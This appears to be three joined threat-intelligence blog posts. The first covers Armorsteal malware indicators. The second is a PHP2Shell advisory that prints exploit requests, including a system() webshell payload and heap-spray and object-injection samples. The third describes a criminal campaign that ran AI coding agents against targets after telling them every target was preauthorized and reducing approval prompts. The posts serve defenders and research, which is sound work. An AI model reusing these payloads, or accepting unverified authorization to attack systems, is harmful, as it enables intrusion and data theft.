browser cookie files. Threat Actor InfrastructureZscaler Threat Hunting identified Armorsteal lure and C2 domains registered on the dates shown in the table below. Shared malware components and an RSA-2048 task-signing key link the Chocolatey and Massgrave lures to the same operation.DomainPurposeRegistration DateRegistrarworkerstats[.]netPrimary C2January 28, 2026NICENICdatamons[.]orgStandby C2May 19, 2026NameSilosupertrap[.]netStandby C2August 29, 2026NameSilomassgravel[.]netFake Massgrave lureAugust 30, 2026NICENICchoclatey[.]orgFake Chocolatey lureSeptember 1, 2026Key-Systemsniceer[.]netStandby C2September 1, 2026NICENICTable 5: Armorsteal lure and C2 domain registration details.Zscaler Threat Hunting observed two phases of the campaign’s infrastructure changes during the analysis period. In the first phase (early September 2026), the fake Chocolatey website and its subdomains were hosted at 209.99.186[.]187, an SKN Subnet & Telecom server. At this time, workerstats[.]net was protected by Cloudflare and resolved to 104.21.87[.]146.In mid-September 2026, the operator moved the Chocolatey and Massgrave lure websites to 82.153.135[.]80, hosted by AKILE LTD in the United Kingdom. The primary C2 domain, workerstats[.]net, also moved from Cloudflare to 186.2.175[.]183, hosted by IQWeb FZ-LLC and using DDoS-Guard name servers.During continued monitoring (early October 2026), Zscaler Threat Hunting observed further changes to Armorsteal’s C2 infrastructure. The previously used domain, workerstats[.]net, became unavailable, and the threat actor began using pymons[.]is and the previously dormant domain datamons[.]org as C2 servers. The threat actor subsequently changed how the surveillance and information stealing modules were downloaded. Previously accessible through the C2 server’s /downloadables/ path, the packages now require a token in the request URL and an X-Verify header containing the correct token. Requests use /C2/?t=[token]451 for surveillance and /C2/?t=[token]452 for information stealing. Successful requests retrieve ZIP packages from /p/[32hex].zip, with randomized filenames. Remediations And Detection OpportunitiesFor organizations that suspect exposure to this campaign, we recommend the following actions:Investigate systems for SysCheck2 and SysCheckX scheduled tasks.Hunt for files and directories under C:\Windows\SystemHealth\Update\.Review PowerShell logs for downloads from choclatey[.]org, community[.]choclatey[.]org, and massgravel[.]net.Block the verified malicious lures and C2 domains.Review outbound HTTPS traffic for /receive_infof, /get-global, /black-watch/, and /infame/receive/ where URL paths are visible in your telemetry.Review endpoint telemetry for browser processes started with --remote-debugging-port=9222.Remove unauthorized Microsoft Defender exclusions, particularly exclusions for C:\Windows.Educate users to verify software download websites and PowerShell installation commands before execution. ConclusionArmorsteal is a Python-based malware family distributed through an active SEO poisoning campaign that uses fake Chocolatey and Massgrave websites. The campaign deploys modules for remote access, cryptocurrency theft, clipboard hijacking, and credential stealing. The shared malware components, task-signing key, and C2 infrastructure link both lures to the same operation. Although the operator changed hosting and package filenames during our analysis, the core malware components remained unchanged. The Zscaler Threat Hunting team continues to monitor the campaign for infrastructure and payload changes. Zscaler CoverageZscaler’s multilayered cloud security platform detects indicators related to Armorsteal at various levels. The figure below depicts the Zscaler Cloud Sandbox, showing detection details for Armorsteal.Figure 4: Zscaler Cloud Sandbox report for Armorsteal.In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators related to Armorsteal at various levels with the following threat names:PS.Dropper.ArmorstealPython.PWS.ArmorstealZscaler MDR detects this threat with these detection analytics:WIN-CONHOST-HEADLESS-CMDWIN-SCHTASKS-CREATE-SHELLWIN-PYTHON-CHROMIUM-HEADLESS Indicators Of Compromise (IOCs)File indicatorsSHA256FilenameDescriptionf3846ec2a6ff0a27d9ef2b9bf7908743b81d295ef29344acfb96ff83fff994f9install.ps1MAS lure installerfb1181160e9f10ce1eb5e5dc9bc23e1498a39110ee9ea361fd150454cb01b292install.ps1Chocolatey lure installer3e3b62a9836697d978cbb620dc8af8f6eefdf8cb73fc30d16bb394d1c58f4c97Update.zip / Updatef.zipRemote access module237ba698d7dc8936c43e0e78e7644002375e51e8baf9b3a7d4e18683f871ee31nig20084.zipSurveillance modulebe0329d0795dd62ae587faf97e704bb36413e5c98ddd8fe575f5077db3c84e5fgetthem20084.zipStealer module 04d2828155ed2a276cfd3c97d4f966d328391dd818e04e773212cd601e49fa74nig20083.zipOlder stealer module56f05c4fb1c25c04e0dde60e2e5e41ac164a6dc53688d0f9eb52a55f82106389getthem20083.zipOlder stealer module0ea99fbbe29af6f797e3866ed5f822c7a5d3e9cdb990a8c382a715069f156499SysMon.pyRemote access module8fb7aaf2b9270b8b75f6844aaefd5242b4f926fb89cba10fff3d9b908a769788basrq.pySurveillance module5410c2f239c3649928383c4478dea182f90b21f5b258081fec07e9d297ae4b1cgot.pyStealer moduleNetwork indicatorsIndicatorTypechoclatey[.]orgFake Chocolatey domainmassgravel[.]netFake MAS domainworkerstats[.]netC2 domainpymons[.]isC2 domaindatamons[.]orgInitially standby C2; later activeniceer[.]netsupertrap[.]netStandby C282[.]153[.]135[.]80Payload host186[.]2[.]175[.]183C2 IP address186[.]2[.]163[.]185C2 IP address190[.]115[.]31[.]69C2 IP address209[.]99[.]186[.]187Payload host

articles.full_text: *October 26, 2026: This advisory has been updated to clarify language describing exploitability and potential impact.*October 23, 2026: This advisory has been updated with new ThreatLabz analysis and Zscaler Deception telemetry on exploitation activity observed during the first 48 hours following disclosure.IntroductionOn October 21, 2026, two critical remote code execution (RCE) vulnerabilities, CVE-2026-109618 and CVE-2026-109619, collectively referred to as “PHP2Shell,” were publicly disclosed. Both vulnerabilities carry a CVSS v4.0 score of 9.2 out of 10. The PHP security team has released emergency patches and strongly encouraged all PHP users to update immediately. These flaws reside in the PHP core language runtime and successful exploitation could allow an unauthenticated remote attacker to achieve remote code execution on any server running a vulnerable version, potentially enabling unauthorized access, data theft, or further system compromise. Given PHP's pervasive deployment across web infrastructure globally - including applications like WordPress, Drupal, Joomla, and Magento, as well as embedded devices and similarly overlooked public-facing platforms - the potential attack surface is significant. The vulnerabilities could enable automated exploitation of exposed, vulnerable PHP deployments without authentication or user interaction. The vulnerabilities therefore may be attractive targets for exploitation.ThreatLabz analysis indicates that attackers began rapidly targeting these vulnerabilities following public disclosure, highlighting the need for organizations to patch vulnerable PHP deployments immediately.Zscaler’s security team has analyzed this issue across both production and corporate environments and has ruled out any impact to Zscaler Cloud Platforms, products, distributed components, services, or our enterprise environment, as detailed in the Trust post. RecommendationsOrganizations running PHP should take the following actions:Patch immediately: Upgrade PHP to one of the fixed versions: 8.5.12, 8.4.27, 8.3.36, or 8.2.35. Linux package maintainers received patches in advance and may already have updated packages available. PHP packages for most Linux distributions may also include the patches backported to previous versions of the software, so consult the release notes for your specific installation to ensure your systems are covered.Deactivate unpatched instances: Consider fully disabling services for any PHP instance that cannot be immediately patched. While this may seem overly cautious, any unpatched instance could be targeted by opportunistic adversaries and result in shell-level access to the vulnerable host. Inventory PHP deployments: Conduct an immediate inventory of all PHP installations across your environment, including standalone servers, vendor appliances, bundled software (WordPress, Magento, WooCommerce, Shopware), and hosting panels (cPanel, Plesk, etc).Migrate off EOL branches: Organizations running PHP 5.4+, 7.x, 8.0, or 8.1 must migrate to a supported branch immediately. No official binary patches will be released for these versions.Isolate EOL instances that cannot be immediately migrated: Migrating EOL instances is strongly recommended. If this is not possible, isolating unpatchable applications from the internet and other untrusted networks may provide some level of protection. This should be considered a high-risk mitigation and reserved only for business and mission-critical applications while implementing aggressive monitoring of these instances.Monitor for exploitation: Audit web server logs (including but not limited to Apache, Nginx, etc.) for unusual segmentation faults, crash dumps, or abnormal memory usage patterns that may indicate active exploitation attempts.Mitigate risk through PHP settings: While not a definitive fix, mission critical applications that cannot be disabled or immediately patched may benefit from reviewing and tightening memory_limit and max_execution_time settings in php.ini to avoid triggering OOM conditions. Consult additional guidance regarding mitigations through setting session.upload_progress.enabled = Off and disabling multipart uploads at the service edge. ThreatLabz Observes Exploitation Attempts Within 48 HoursThreatLabz observed scanning activity and possible exploitation attempts targeting the PHP2Shell vulnerabilities using multiple attack tools and exploitation methods, including RCE payloads, PHP object injection, and named exploitation frameworks, indicating rapid, in-the-wild exploitation attempts.In the first 48 hours after the PHP2Shell disclosure, Zscaler’s global decoy mesh observed 1,156 exploitation attempts from 156 unique attacker IPs targeting 70 organizations. As a rapid response measure, a new detection rule for PHP2Shell exploitation has been pushed to all Zscaler Deception customers.Attack chainAutomated scanning activity observed by Zscaler suggests attackers may be attempting to use a two-stage PHP2Shell exploitation chain, as shown in the figure below.Figure 1: Notional exploit chain consistent with scanning and exploit attempts observed by ThreatLabz.Stage 1: State setup and fatal triggerThe attacker sends a crafted multipart/form-data POST request containing:A PHPSESSID field to associate the request with a known session, making the session filename (sess_[PHPSESSID]) predictable.The PHP_SESSION_UPLOAD_PROGRESS field to force PHP to begin session bookkeeping during multipart parsing, populating vulnerable global state pointers and writing attacker-controlled data into the session file.A file attachment whose filename= parameter contains either PHP code or a serialized object string.A body sized or structured to exhaust memory (CVE-2026-109618) or trigger a fatal error (CVE-2026-109619).When the fatal condition is triggered, longjmp() aborts the request, freeing per-request memory but leaving stale global pointers.Stage 2: Heap reclaim and code executionThe attacker immediately sends a second request to the same worker process. This second request contains the attacker's payload, sized and aligned to reclaim the freed memory slots. When PHP processes the new request and references the stale global state before re-initialization occurs, it reads and executes the attacker-controlled data, achieving arbitrary code execution with the privileges of the PHP worker process.Zscaler Deception telemetry findingsThreatLabz observed malicious POST requests targeting the PHP2Shell exploitation path across multiple tools and stages of the attack chain. Every observed request is a multipart/form-data POST targeting PHP endpoints, specifically /, /index.php, /api/endpoint.php, and /app/upload.php.Exploitation payloads observed1. ShellFlow PHP2Shell named exploit toolThe most forensically significant artifact is the presence of a multipart boundary string that explicitly names the exploitation tool. This indicator should not be considered durable, as an adversary can trivially replace the known strings with something less obvious. At this time, the ShellFlow tool uses a known boundary value, so it is a useful indicator for detecting the unmodified tool. The exploit tool request is shown below. POST / HTTP/1.1 Content-Type: multipart/form-data; boundary=----shellflow-php2shell ------shellflow-php2shell Content-Disposition: form-data; name="PHPSESSID" sf618_ec172709c8b74601 ------shellflow-php2shell Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS" shellflow_poc ------shellflow-php2shell Content-Disposition: form-data; name="f"; filename="poc.bin" Content-Type: application/octet-stream AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...15485 bytes total...]The multipart boundary shellflow-php2shell identifies the attacking tool by name. The poc.bin file body contains more than 15k bytes of data along with a repeated AAAA... characters, a characteristic heap spray pattern used for memory layout control in the CVE-2026-109618 OOM corruption path.Notable characteristics:The boundary string shellflow-php2shell directly identifies the ShellFlow PHP2Shell attacking tool, which is publicly linked to CVE-2026-109618 scanning activity.The session ID sf618_ec172709c8b74601 contains sf618, possibly reflecting a developer’s shorthand reference to ShellFlow + CVE-2026-109618.The application/octet-stream upload with a repeating AAAAA... buffer is consistent with a heap spray technique used to influence the memory layout when the OOM condition is triggered.2. Active system() command execution payloadThese requests represent the strongest indication of automated exploitation attempts. The filename= field contains a fully formed PHP webshell instruction designed to be written into the PHP session file through the session.upload_progress handler and later executed, as shown in the example below.The filename= value [?php system('echo 'exploited digga' > pwned.txt');echo 'RCE';?] instructs the PHP runtime to:Execute the OS command echo 'exploited digga' > pwned.txt, writing a proof-of-compromise marker to disk.Echo the string RCE in the HTTP response body, providing an indication of successful code execution to the attacker. The RCE string may still be returned even if the preceding echo redirection fails.This payload pattern was observed in two separate requests with identical content, consistent with automated retry behavior commonly seen in exploit frameworks.3. PHP object injection via pipe delimiterThreatLabz also observed a PHP object injection request that abuses the session pipe delimiter, as shown in the example. The filename x|O:8:"stdClass":0:{} uses the PHP default session serialization format, where the | character separates a variable name from its serialized value.POST /app/upload.php HTTP/1.1 Content-Type: multipart/form-data; boundary=--NeoMM2026 --NeoMM2026 Content-Disposition: form-data; name="PHPSESSID" neosc4n00000000000000002 --NeoMM2026 Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS" neo_obj_inject --NeoMM2026 Content-Disposition: form-data; name="f"; filename="x|O:8:\"stdClass\":0:{}" Content-Type: text/plain Z --NeoMM2026--Overall attack tool fingerprinting summaryThreatLabz identified multiple distinct attacker toolsets through analysis of numerous requests in our telemetry, as summarized in the table below:Tool / FrameworkIdentifying MarkersShellFlow PHP2ShellBoundary shellflow-php2shell; session ID prefix sf618; poc.bin heap sprayActive RCE OperatorBoundary --VERIFY; system() payload in filename=; pwned.txt writeNuclei CVE TemplatesBoundary prefix ------Nuclei; echo-test random token in filenameNeo ScannerBoundary --NeoMM2026b / --NeoMM2026; targets /api/endpoint.php, /app/upload.phpTable 1: Attacker tools and identifying markers observed in PHP2Shell exploitation activity. Affected VersionsAll PHP versions from 5.4 onward are vulnerable. Only currently supported branches received patches, but package maintainers may also backport the security patches to previous versions. Carefully review the instructions and release notes from the maintainers of your PHP installations to determine what version and release includes the necessary patch.PHP BranchVulnerable VersionsPatch AvailablePHP 8.58.5.0 – 8.5.11Yes (8.5.12)PHP 8.48.4.0 – 8.4.26Yes (8.4.27)PHP 8.38.3.0 – 8.3.35Yes (8.3.36)PHP 8.28.2.0 – 8.2.34Yes (8.2.35)PHP 8.1All versions (EOL)No (EOL — upgrade required)PHP 8.0All versions (EOL)No (EOL — upgrade required)PHP 7.xAll versions (EOL)No (EOL — upgrade required)PHP 5.4+All versions (EOL)No (EOL — upgrade required)Table 2: CVE-2026-109618 and CVE-2026-109619 Affected PHP Versions and Patch Availability How It WorksBoth vulnerabilities are use-after-free memory safety flaws in PHP's core request-handling engine. All PHP installations serving web requests may be affected regardless of security controls. The vulnerabilities can allow unauthenticated attackers to execute code on affected servers or read sensitive process memory; that memory may contain passwords, authentication tokens, API keys and certificates belonging to other requests or the server itself.CVE-2026-109618: OOM Corruption / Uninitialized Memory UseCVSS v4.0: 9.2 - CriticalRoot Cause: PHP uses longjmp() to abort a request when it hits its configured memory limit. When a web application receives form input, PHP records new entries in its internal POST data structure before finishing their initialization. If an out-of-memory (OOM) error fires while internal request data is only partially initialized, longjmp() bypasses normal control flow, leaving memory in an inconsistent/uninitialized state. During request cleanup, PHP misinterprets this invalid data as valid and follows an attacker-controlled code pointer, yielding control of execution.Exploit Vector: An attacker can intentionally trigger specific OOM conditions (e.g., via large memory allocations, deeply recursive calls, or maliciously crafted request payloads) to corrupt state and achieve unauthenticated RCE.Impact: Unauthenticated Remote Code ExecutionCVE-2026-109619: Use-After-Free / Stale Memory AccessCVSS v4.0: 9.2 - CriticalRoot Cause: When PHP encounters a fatal error and calls zend_bailout() (via longjmp()), request-owned internal state can survive in global memory after its backing allocation has been freed. PHP workers process multiple requests in sequence, and certain internal pointers persist between requests. If a request crashes or exhausts memory at the right moment, those pointers are left pointing to already-recycled memory. A subsequent request processed by the same worker may access this stale memory before re-initialization occurs.Exploit Vector: This vulnerability is chainable with CVE-2026-109618. The partial initialization in CVE-2026-109618 allows an attacker to shape the freed memory contents and gain control of the instruction pointer, potentially enabling RCE. Chaining these two CVEs requires no authentication and no user interaction.Impact: Unauthenticated Remote Code Execution and memory/credential disclosure ConclusionPHP2Shell represents a significant security issue because of the severity of the vulnerabilities and PHP’s broad deployment. The combination of CVE-2026-109618 and CVE-2026-109619 could provide an unauthenticated path to RCE and potentially broader server compromise without user interaction.Organizations are strongly urged to treat this as an emergency patching event. Systems running EOL PHP branches must be migrated without delay. Where patching cannot be completed immediately, network-layer controls should be applied as an interim measure.ThreatLabz will continue to monitor active exploitation campaigns and update Zscaler platform protections as new indicators emerge. How Zscaler Can HelpThe following table shows the typical attack stages and the mitigations recommended by Zscaler.Attack StageRecommended MitigationMinimize the external attack surfaceIdentify and fix any vulnerable PHP applications with Zscaler Exposure ManagementEliminate externally exposed PHP assets by leveraging a Zero Trust architecture.Prevent compromiseDetonate unknown second-stage payloads with Advanced Cloud Sandbox.Route server egress through ZIA to detect/block post-compromise activity.Enable SSL/TLS inspection for all traffic, including trusted sources.Enable Advanced Threat Protection to block known C2 domains.Use Advanced Cloud Firewall, to extend C2 controls across all ports/protocols, including emerging C2.Prevent lateral threat movementUse ZPA to enforce least-privilege user-to-app segmentation for crown-jewel apps (employees and third parties).Use ZPA inline inspection to block exploitation attempts against private apps from compromised users.Use Zscaler Deception to detect and contain lateral movement or privilege escalation with decoy assets and accounts.Use Zscaler MDR and Threat Hunting to detect and respond to early stage threat activity.Prevent data lossInspect outbound traffic across channels with Zscaler DLP. articles.title: Inside a Global AI-Assisted Hacking Campaign
articles.context: However, ThreatLabz discovered additional information about the attack, which went far beyond South Korea
articles.full_text: IntroductionIn October 2026, Zscaler ThreatLabz investigated AI-assisted cyberattacks that combined the ARTEX penetration testing framework with AI coding assistants and custom automation scripts. Initial reporting of the incident identified the targeting of South Korean financial institutions. However, ThreatLabz discovered additional information about the attack, which went far beyond South Korea. The AI-assisted attacks were widespread and targeted organizations around the globe and in multiple industry sectors.In this blog post, ThreatLabz examines the operator’s working environment, explains the roles assigned to AI models and tools, and analyzes the targeting and objectives reflected in the operator’s prompts. Key TakeawaysIn October 2026, ThreatLabz discovered information about an AI-assisted attack combining a customized ARTEX deployment with Claude Code, Codex, and Grok workspaces. Custom scripts shared instructions and supported handoffs between AI sessions.ARTEX was configured to use a DeepSeek model through an OpenAI-compatible gateway, but other configurations also specified DeepSeek, GLM, and Grok.Prompts directed AI models to divide investigation tasks and review one another’s findings, including instructions for GLM to review work performed by DeepSeek and its subagents.Saved project records and synchronization scripts were designed to preserve investigation context and progress across accounts, servers, and AI sessions. Prompt histories revealed targeting across multiple industries and geographic regions. Requests for bulk personal and transaction data, alongside questions about selling stolen data, suggest the attacks were financially motivated. BackgroundThreatLabz identified an ARTEX deployment that included AI assistant configurations, synchronization scripts, network routing tools, and a Claude Code prompt history. The recorded prompts spanned August 4 through October 4, 2026 (UTC). CrowdStrike separately reported on related ARTEX infrastructure and the targeting of South Korean financial organizations on October 7, 2026. This blog examines the broader working environment of the attacks and targets. Operator InfrastructureThe figure below illustrates the threat actor’s environment based on saved configurations and instructions.Figure 1: Architectural diagram of AI-assisted attack environment using ARTEX. Technical AnalysisThe following sections examine the operator’s infrastructure, customized tooling, AI environment configuration, and targeting objectives, offering a closer look at the workflow behind the campaign.Work server and jump serverAs Recorded Future detailed in their recent blog post, the operator's work server stored project files, scripts, AI settings, and a local ARTEX deployment. The jump server, 38.244.50.120, served as the default route for connections to targets.The jump server also ran additional AI sessions. The operator delegated research tasks to Grok on that server and instructed a separate AI session to review Grok’s findings. This setup divided work between the two servers, with the operator providing oversight and direction. Three custom scripts synchronized shared AI instructions and supporting files across accounts, which are described in the table below.Script namePurposetools/sync-all.shUses SSH and rsync to copy AI instructions, reusable task guides, saved notes, and tools to the jump server's root, claude, grok, and gemini accounts.sync-memory.shCopies saved AI notes, known as memory files, to locations on the jump server.tools/sync-cc-users.shCopies shared Claude Code instructions and supporting files to the gemini and glm accounts on the work server.Table 1: Custom synchronization scripts and their purposes for AI-assisted attacks.Each account maintained its own AI service settings. The synchronization scripts were designed to update model references within specialist agent instructions to match the destination account, allowing the workspaces to use shared instructions with different model configurations.The scripts also incorporated backups and validation checks designed to avoid overwriting modified destination files. These mechanisms indicate that the operator intended to keep configurations consistent across environments.Customized ARTEX deploymentARTEX is an AI-assisted penetration-testing framework. Its planner-and-worker architecture lets an operator define a goal, which AI agents break down into tasks, execute using tools, and document by retaining assets and findings for review. The recovered deployment extends the framework with additional tools for web, network, and Android analysis.The saved Docker Compose file defines an ARTEX container and a PostgreSQL 16 database. It configured the ARTEX interface to use host port 8890 and mapped PostgreSQL to 127.0.0.1:5435. The ARTEX container uses a custom image tagged artex-local:perf2-20261003. The corresponding Dockerfile adds tools including nmap, sqlmap, nuclei, httpx, jadx, apktool, and frida-tools. It also adds Python libraries for web processing and spreadsheet output and replaces the original ARTEX program with the operator’s local version.AI model setupThe operator changed model routing over time and used account names that did not always match the configured model. To understand this setup, it is important to distinguish the client application, such as Claude Code, from the model service receiving its requests.For example, the saved ARTEX environment configuration specifies:ARTEX_LLM_PROVIDER=openai ARTEX_LLM_MODEL=deepseek-v4.1-flash ARTEX_LLM_BASE_URL=https://xcai.pro/v1Here, openai specifies an OpenAI-compatible API format. The model field requests deepseek-v4.1-flash, while the base URL routes requests to xcai.pro. These settings identify the requested model and gateway endpoint, but do not confirm which underlying model the gateway actually served.The table below summarizes the model assignments recorded in the collected configurations. Model names are reproduced as requested IDs and were not independently verified.Workspace or componentRequested model IDsRoleARTEX local deploymentdeepseek-v4.1-flashModel backend for ARTEX's task workflow, configured through https://xcai.pro/v1.Codex (.codex/config.toml)deepseek-v4-proAlternative coding-agent interface configured to send requests to https://api.deepseek.com/v1.Local account named gemini, running Claude Codedeepseek-v4.1-flashWorkspace using shared instructions and specialist agents.Local account named glm, running Claude Codeglm-5.3Workspace configured to request GLM and use the shared workflow.Jump-host accounts named root and claudeglm-5.3, glm-5.3-flashAssigned analyzer and collector roles in the jump-host synchronization script.Jump-host account named grokgrok-4.7-xhigh, grok-4.7-build-fastAssigned analyzer and collector roles; operator also requested remote research and continued auditing.Jump-host account named gemini xcai/deepseek-v4.1-flashWorkspace the operator explicitly requested to reconfigure to use DeepSeek.Table 2: AI model configuration and assigned roles used in the AI-assisted attacks.In some instances, the threat actor assigned distinct roles to individual AI models. The prompt history includes instructions for DeepSeek to conduct the initial investigation, followed by GLM reviewing the findings for potential gaps. One translated prompt states: "When DeepSeek says it has exhausted all attack surfaces and I say to start a GLM review, GLM should review DeepSeek's previous work and its subagents' work."Later prompts assigned GLM additional investigation tasks, extending its intended role beyond reviewing DeepSeek’s findings.The operator requested both Grok’s native terminal application and a Claude Code setup configured to use Grok as its underlying AI model. For the Claude Code integration, the operator installed a bridge service called grok2api on the jump server. Prompts assigned extensive research tasks to Grok on that server and other AI sessions to review its output. The prompt history shows repeated requests to modify this configuration, but the specific setup used for each task could not be confirmed.The records establish the use of the Claude Code application, with configurations specifying DeepSeek, GLM, and Grok. However, since the underlying model responding to each session could not be independently verified, it's possible that some sessions used Anthropic’s Claude models.Persistent project stateThe operator organized each investigation into a separate folder. A script created files to record targets, testing progress, notes, vulnerability reports, and supporting evidence. These records provided context that an AI assistant could read to resume an investigation in a later session.File or folderWhat it recordsscope.mdWebsites, servers, or applications selected for investigation.surface.mdDiscovered pages, APIs, and other entry points, including their testing status.notes.mdCompleted work, decisions, and next steps.findings/Reports on potential or confirmed vulnerabilities.evidence/Supporting files, such as captured responses and tool output.Table 3: AI-assisted attack investigation files and folders and their purposes.The operator also configured a mechanism to help AI sessions retain context, track progress, divide tasks, and resume work started in other sessions:Provide project context with each prompt: An automated hook script (tools/project_context_hook.py) was configured to execute when a new prompt was received, read the current project files, and attach a brief summary of testing status, recent notes, and paths to relevant memory files. This provided context to help the AI continue previous work.Distribute tasks among specialized AI agents: The operator created tailored instructions for agents assigned to discover APIs, review source code, or analyze Android applications. The primary AI session was directed to validate their outputs before recording them as confirmed findings.Reduce operator approval requirements: The instructions directed the AI to assume that all supplied targets were preauthorized. Some application settings also permitted autonomous actions without requiring explicit operator approval for each step.Facilitate cross-session handoffs: The operator configured Codex to ingest saved instructions and notes, allowing other accounts to access prior conversation histories. A task guide also instructed the AI running under the jump server's gemini account on how to take over an ARTEX task and review its results.Proxy exits, tunnels, and cloud backupThe operator instructed the AI tools to connect to targets through the jump server. Additional proxy configurations provided separate outbound IP addresses for individual projects, helping limit direct connections between the primary work server and target environments.SSH tunnels were configured to support bidirectional communication between the two servers for AI and file services. Background monitoring tasks were configured to restart supporting services and tunnels if they were interrupted.Investigation assets were archived to Backblaze B2, with reports, supporting evidence, source code, data exports, and backups organized into separate directories. This structure followed the operator's directive to separate each target's operational data from its final analysis report for easier retrieval.Target profile and objectivesThe prompt history showed targeting beyond South Korean financial institutions, including dating applications, SMS providers, cryptocurrency and payment platforms, gift-card portals, gambling sites, retail platforms, educational services, logistics companies, and legal settlement systems. The targets also spanned multiple geographic regions, suggesting an opportunistic approach. The recorded prompts included requests to scan or investigate organizations in Canada, China, Cuba, Hong Kong, India, Indonesia, Japan, Kazakhstan, Kenya, Malaysia, Nigeria, South Africa, South Korea, Taiwan, Thailand, the United Arab Emirates (UAE), the United Kingdom, the United States, and Vietnam. The figure below shows the geographic distribution of targets referenced in the operator’s prompt history.Figure 2: Geographic distribution of targets referenced in the AI-assisted attacks prompt history.The table below summarizes representative target categories and the desired outcomes requested in the threat actor's prompts:Target or sectorRequested outcome in the prompt historySocial and dating servicesCollect frontend files and subdomains; gain access to user records.SMS providersGain administrative access, obtain SMS-channel credentials, or identify ways to send unlimited messages at no cost.RetailObtain customer order data.EducationObtain course-purchase records or user data.Investment servicesReview prior investigation records and obtain current data.Cryptocurrency and digital assetsFind a vulnerability that would allow NFT gifts to be obtained for free.Legal claims administrationReview investigation records, analyze claim workflows, and assess opportunities for additional access.Table 4: Representative target sector categories and requested outcomes in AI-assisted attacks prompt history.Prompt histories indicate an explicit focus on obtaining structured personally identifiable information (PII) and mobile phone numbers. In one instance, the operator stated that database dumps lacking phone number fields were of no value and requested alternative injection methods. In another prompt, the operator questioned why a specific SQL query targeting demographic data for female users over 30 returned only approximately 300 records.The threat actor instructed AI models to decrypt encrypted fields, parse transaction histories, translate database schemas into Chinese, and remove irrelevant metadata. These requests suggest an intent to prepare datasets for monetization.Prompts about underground data marketplaces further support this assessment. In one example, the operator asked: "If hackers compromise Korean data, where do they usually sell it?"Additional prompts focused on extracting payment gateway API keys, exploiting NFT minting workflows, and gaining unauthorized administrative privileges.To reduce the risk of detection, the threat actor explicitly warned AI models not to initiate direct account withdrawals, noting that unauthorized financial transactions could trigger security alerts or create traceable records. Threat AttributionThe recovered records point to a Chinese-speaking operator. The operator wrote predominantly in Chinese, requested Chinese as the default response language, specified China Standard Time, and instructed the AI to translate exported data fields into Chinese. In discussions about SMS services and app downloads, the operator referred to Chinese services and applications as “domestic.” The operator also supplied the same mobile number in mainland China format for accounts with a Chinese proxy provider and a cloud-phone service. ConclusionThis investigation shows how a threat actor combined open source security tools, AI assistants, and custom automation scripts to launch attacks globally. Shared project records, specialized agents, and instructions for reviewing other models’ findings created a workflow designed to continue investigations across AI sessions under the operator’s direction. The prompt history also revealed broad targeting and an emphasis on obtaining personal and financial data, indicating the attacks were likely financially motivated.To defend against AI-assisted attacks, organizations should adopt a Zero Trust architecture that minimizes internet exposure and enforces least-privilege access. The Zscaler Zero Trust Exchange supports these principles by making applications invisible to the public internet and restricting access to authorized users. Zscaler Exposure Management, part of Agentic SecOps, helps identify and prioritize exposures for remediation, while Zscaler Deception uses decoys to detect unauthorized exploration and divert attacks from legitimate assets.
